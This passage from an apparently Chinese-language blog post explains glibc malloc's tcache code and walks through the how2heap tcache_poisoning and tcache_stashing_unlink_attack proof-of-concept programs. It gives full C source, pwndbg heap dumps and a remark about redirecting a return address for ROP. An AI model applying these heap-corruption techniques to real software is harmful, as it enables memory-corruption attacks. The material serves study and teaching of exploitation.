order */</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert(chunk_main_arena(bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)chunksize_nomask(bck-&gt;bk))</span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert(chunk_main_arena(fwd));</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size &lt; chunksize_nomask(fwd))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert(chunk_main_arena(fwd));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size == (<span class="type">unsigned</span> <span class="type">long</span>)chunksize_nomask(fwd))</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      mark_bin(av, victim_index);</span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">   filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;<span class="comment">//unsortedbin中最大可以容忍的缓存次数</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span> &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">      &#125;<span class="comment">//结算阶段,如果return_cached是正合适大小的堆块入tcache的标记,如果被置1说明至少能从tcache中找到一个合适的堆块</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS 10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//unsortedbin这里的循环最多10000次</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>跳出unsortedbin循环,再检查一次tcache中是否有合适堆块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">    <span class="keyword">if</span> (return_cached)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>后面使用largebin和topchunk进行分配时不会有tcache的缓存使用了</p>
<h3 id="int_free">int_free</h3>
<p>释放时的tcache操作很简单,只在int_free中有一个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_put(p, tc_idx);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>如果这堆块的大小在tcache的管理范围内,那么在一切释放工作开始之前,首先尝试将这个堆块放到tcache中</p>
<p>如果缓存则直接返回</p>
<h2 id="how2heap">how2heap</h2>
<h3 id="tcache_poisoning">tcache_poisoning</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两个malloc然后两个free之后,两个堆块就放到tcache中了</p>
<p>如果没有tcache,这俩都应该放在fastbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x8403000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x8403250</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x84032e0</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x8403260</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x8403370</span><br><span class="line">Size: 0x20c91</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tcache</span><br><span class="line">&#123;</span><br><span class="line">  counts = <span class="string">&quot;\000\000\000\000\000\000\000\002&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">55</span> times&gt;,</span><br><span class="line">  entries = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x84032f0</span>, <span class="number">0x0</span> &lt;repeats <span class="number">56</span> times&gt;&#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; tcachebin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x84032f0</span> —▸ <span class="number">0x8403260</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcachebin[idx]&quot;]----&gt;b[&quot;b@0x84032f0&quot;]----&gt;a[&quot;a@0x8403260&quot;]----&gt;null</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此时b[0]就是其指向a的next指针,直接修改b[0]就可以玩坏tcache</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tcachebins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x84032f0</span> —▸ <span class="number">0x7ffffffedde8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>这就把栈上的<code>stack_var@0x0x7ffffffedde8</code>连接到tcache上了</p>
<p>下一次分配会拿走b</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcachebin[idx]&quot;]----&gt;stack_var[&quot;stack_var@0x0x7ffffffedde8&quot;]----&gt;null</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>再下一次分配c就会拿走stack_var</p>
<p>也就是说c指向<code>0x0x7ffffffedde8</code>这个地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">1</span> = (<span class="type">intptr_t</span> *) <span class="number">0x7ffffffedde8</span></span><br></pre></td></tr></table></figure>
<p>如果我们把<code>b[0] = (intptr_t)&amp;stack_var;</code></p>
<p>改成<code>b[0] = (intptr_t)&amp;rip;</code>也就是篡改了函数返回地址</p>
<p>然后就可以通过<code>c[0]=&amp;vuln_func</code>进行ROP攻击</p>
<h3
id="tcache_stashing_unlink_attack">tcache_stashing_unlink_attack</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>首先顺序分配9个堆块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后把[3,8]这六个放到tcache中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后将1放到tcache中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
<p>此时tcache中的结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcache[idx]&quot;]----&gt;1----&gt;8----&gt;7----&gt;6----&gt;5----&gt;4----&gt;3</span><br></pre></td></tr></table></figure>
<p>然后将0和2先后放到unsortedbin上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">	unsortedbin&lt;----&gt;2&lt;----&gt;1</span><br></pre></td></tr></table></figure>
<p>然后分配一个0xa0大小的堆块,显然所有0x90的堆块都不合适,需要到topchunk上切割新的,但是对这个0xa0的分配过程中,会让unsortedbin中的堆块分类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">smallbin[&quot;smallbin[idx]&quot;]&lt;----&gt;1&lt;----&gt;2</span><br></pre></td></tr></table></figure>
<p>然后分配两个0x90,这次命中tcache</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcache[idx]&quot;]----&gt;5----&gt;4----&gt;3</span><br></pre></td></tr></table></figure>
<p>然后篡改位于smallbin中的2号堆块的bk指针,改成stack_var的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_lis[2][1] = (unsigned long)stack_var;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">smallbin[&quot;smallbin[idx]&quot;]&lt;----&gt;1&lt;----&gt;2----&gt;stack_var</span><br></pre></td></tr></table></figure>
<p>然后calloc(1,0x90)会绕过lib_malloc,直接调用int_malloc,这就绕过了tcache分配,使用smallbin分配,把1号堆块从smallbin上卸下来,然后将2和伪造的stack_var假堆块放到tcache中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcache[idx]&quot;]----&gt;stack_var----&gt;2----&gt;5----&gt;4----&gt;3</span><br></pre></td></tr></table></figure>
<p>此时再分配<code>target = malloc(0x90);</code>就是在libc_malloc中使用tcache进行分配</p>
<p>target拿到的就是一个栈地址了</p>
